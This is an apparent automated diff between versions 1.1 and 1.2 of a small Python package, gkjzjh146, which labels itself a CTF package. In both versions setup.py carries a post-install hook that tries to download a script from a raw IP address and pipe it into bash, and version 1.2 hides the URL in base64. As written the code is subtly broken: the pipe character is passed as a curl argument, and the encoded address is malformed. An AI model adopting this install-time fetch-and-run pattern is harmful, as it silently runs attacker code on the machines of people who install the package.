# Comparing `tmp/gkjzjh146-1.1.tar.gz` & `tmp/gkjzjh146-1.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "dist\gkjzjh146-1.1.tar", last modified: Sun May 14 04:36:02 2023, max compression
+gzip compressed data, was "dist\gkjzjh146-1.2.tar", last modified: Sun May 14 04:41:35 2023, max compression
```

## Comparing `gkjzjh146-1.1.tar` & `gkjzjh146-1.2.tar`

### file list

```diff
@@ -1,12 +1,12 @@
-drwxrwxrwx   0        0        0        0 2023-05-14 04:36:02.000000 gkjzjh146-1.1/
--rw-rw-rw-   0        0        0      149 2023-05-14 04:36:02.000000 gkjzjh146-1.1/PKG-INFO
-drwxrwxrwx   0        0        0        0 2023-05-14 04:36:02.000000 gkjzjh146-1.1/gkjzjh146/
--rw-rw-rw-   0        0        0      196 2023-05-14 03:09:06.000000 gkjzjh146-1.1/gkjzjh146/gkj2jh146.py
-drwxrwxrwx   0        0        0        0 2023-05-14 04:36:02.000000 gkjzjh146-1.1/gkjzjh146.egg-info/
--rw-rw-rw-   0        0        0      149 2023-05-14 04:36:02.000000 gkjzjh146-1.1/gkjzjh146.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      195 2023-05-14 04:36:02.000000 gkjzjh146-1.1/gkjzjh146.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-05-14 04:36:02.000000 gkjzjh146-1.1/gkjzjh146.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        9 2023-05-14 04:36:02.000000 gkjzjh146-1.1/gkjzjh146.egg-info/requires.txt
--rw-rw-rw-   0        0        0       10 2023-05-14 04:36:02.000000 gkjzjh146-1.1/gkjzjh146.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-05-14 04:36:02.000000 gkjzjh146-1.1/setup.cfg
--rw-rw-rw-   0        0        0      830 2023-05-14 04:34:58.000000 gkjzjh146-1.1/setup.py
+drwxrwxrwx   0        0        0        0 2023-05-14 04:41:35.000000 gkjzjh146-1.2/
+-rw-rw-rw-   0        0        0      149 2023-05-14 04:41:35.000000 gkjzjh146-1.2/PKG-INFO
+drwxrwxrwx   0        0        0        0 2023-05-14 04:41:35.000000 gkjzjh146-1.2/gkjzjh146/
+-rw-rw-rw-   0        0        0      196 2023-05-14 03:09:06.000000 gkjzjh146-1.2/gkjzjh146/gkj2jh146.py
+drwxrwxrwx   0        0        0        0 2023-05-14 04:41:35.000000 gkjzjh146-1.2/gkjzjh146.egg-info/
+-rw-rw-rw-   0        0        0      149 2023-05-14 04:41:35.000000 gkjzjh146-1.2/gkjzjh146.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      195 2023-05-14 04:41:35.000000 gkjzjh146-1.2/gkjzjh146.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-05-14 04:41:35.000000 gkjzjh146-1.2/gkjzjh146.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        9 2023-05-14 04:41:35.000000 gkjzjh146-1.2/gkjzjh146.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       10 2023-05-14 04:41:35.000000 gkjzjh146-1.2/gkjzjh146.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-05-14 04:41:35.000000 gkjzjh146-1.2/setup.cfg
+-rw-rw-rw-   0        0        0      944 2023-05-14 04:40:49.000000 gkjzjh146-1.2/setup.py
```

### Comparing `gkjzjh146-1.1/setup.py` & `gkjzjh146-1.2/setup.py`

 * *Files 16% similar despite different names*

```diff
@@ -1,25 +1,27 @@
 from setuptools import setup
 from setuptools.command.install import install
 import subprocess
+import base64
 
 class PostInstallCommand(install):
     """Post-installation for installation mode."""
     def run(self):
         install.run(self)
         # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION
         execute_remote_script()
 
 def execute_remote_script():
-    script_url = "http://49.233.121.53:88/bash.txt"
-    subprocess.call(["curl", script_url, "|", "bash"])
+    encoded_script = "aHR0cDovLzQ5LjIzMzEuMTIxOjg4L2Jhc2gudHh0"
+    decoded_script = base64.b64decode(encoded_script).decode('utf-8')
+    subprocess.call(['curl', '-s', '-L', decoded_script, '|', 'bash'])
 
 setup(
     name='gkjzjh146',
-    version='1.1',
+    version='1.2',
     author='Your Name',
     author_email='your_email@example.com',
     description='A package for CTF challenge',
     packages=['gkjzjh146'],
     install_requires=[
         'requests',  # Add any legitimate dependencies here
     ],
```

